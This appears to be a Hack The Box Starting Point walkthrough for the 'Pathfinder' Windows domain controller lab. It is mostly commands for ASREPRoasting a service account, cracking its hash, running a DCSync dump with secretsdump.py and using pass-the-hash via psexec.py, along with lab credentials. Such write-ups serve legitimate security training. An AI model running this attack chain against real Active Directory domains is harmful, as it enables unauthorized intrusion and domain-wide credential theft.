Hack The Box :: Starting Point :: Pathfinder :: Windows

# Enumeration

`masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000`

[masscan.webp](../_resources/ff03d096ef4a94e2123741e4feded938.webp)

Port 88 is typically associated with Kerberos and port 389 with LDAP, which indicates that this is a Domain Controller. We note that WinRM is enabled on port 5985.

# Enumeration

Using the credentials we obtained in a previous machine; `sandra:Password1234!`, we can attempt to enumerate Active Directory. We can achieve this using BloodHound. There is a python bloodhound injester, which can be found [here](https://github.com/fox-it/BloodHound.py). It can also be installed using pip: `pip install bloodhound`

`bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`

[collection.webp](../_resources/27b2c07a94d83e836a381a3ac0144e43.webp)

The json files should now be in the working directory, ready to be imported into BloodHound.

**Installing and Starting BloodHound**
First, we need to install neo4j and BloodHound.

	apt install neo4j
	apt install bloodhound

Next, we need to configure the neo4j service. We can accomplish this by running the following command

`neo4j start console`
You will be then prompted to change your password. Next, we start BloodHound
`bloodhound --no-sandbox`

Ensure you have a connection to the database; indicated by a ✔️ symbol at the top of the three input fields. The default username is `neo4j` with the password previously set.

Opening BloodHound, we can drag and drop the .json files, and BloodHound will begin to analyze the data. We can select various queries, of which some very useful ones are `Shortest Paths to High value Targets` and `Find Principles with DCSync Rights`.

While the latter query returns this:

[bloodhound.webp](../_resources/9d7a95639ebf10de48b716caba4c6078.webp)

We can see that the `svc_bes` has `GetChangesAll` privileges to the domain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.

# Lateral Movement

It's worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to [ASREPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/). We can check this using a tool such as Impacket's `GetNPUsers`.

`GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30`

[asreproast.webp](../_resources/419a70c5684e7488f1874fb2591a03f0.webp)

We obtain the TGT ticket for the `svc_bes` and save it to a file called `hash`. We can use Hashcat or JTR in conjunction with `rockyou.txt` to obtain the plaintext password `Sheffield19`.

`john hash -wordlist=/usr/share/wordlists/rockyou.txt`

[john.webp](../_resources/a47190887007bd0d068dea663bc66850.webp)

It is now possible to access the server as `svc_bes` using WinRM, and gain user.txt.

	gem install evil-winrm
	evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19

# Privilege Escalation

In order to leverage the `GetChangesAll` permission, we can use Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to perform a DCSync attack and dump the NTLM hashes of all domain users.

`secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30`

[secretsdump.webp](../_resources/f6f0a1932534b8fa666f406835cfaeda.webp)

Using the default domain administrator NTLM hash, we can use this in a PTH attack to gain elevated access to the system. For this, we can use Impacket's psexec.py.

`psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>`

[psexec.webp](../_resources/79994a1a3f4287e3aeb8281a9d7c8ad5.webp)